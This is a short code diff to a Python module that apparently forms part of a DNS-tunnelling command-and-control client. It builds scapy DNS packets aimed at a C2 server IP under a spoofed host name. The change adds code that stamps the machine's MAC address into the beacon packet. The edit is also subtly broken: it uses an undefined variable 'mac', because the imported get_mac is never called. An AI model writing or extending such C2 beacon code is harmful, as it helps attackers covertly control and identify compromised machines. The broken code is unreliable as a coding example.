@@ -1,6 +1,9 @@
 # external imports
 from scapy.all import Ether, IP, UDP, DNS, DNSQR, sendp
 
+# system imports
+from uuid import getnode as get_mac
+
 # internal imports
 from utils.consts import INTERFACE, CC_SERVER_IP, CC_SERVER_SPOOFED_HOST, PACKET_OPTIONS
 from utils.request_type import RequestType
@@ -10,7 +13,10 @@ class PingRequest:
         pass
     
     def build(self):
-        ether = Ether()
+        mac_addr = ':'.join(("%012X" % mac)[i:i+2] for i in range(0, 12, 2)).lower() 
+        print(mac_addr)
+        
+        ether = Ether(src=mac_addr)
         ip = IP(dst=CC_SERVER_IP)
         udp = UDP(sport=PACKET_OPTIONS['UDP']['SPORT'], dport=PACKET_OPTIONS['UDP']['DPORT'])
         dns = DNS(
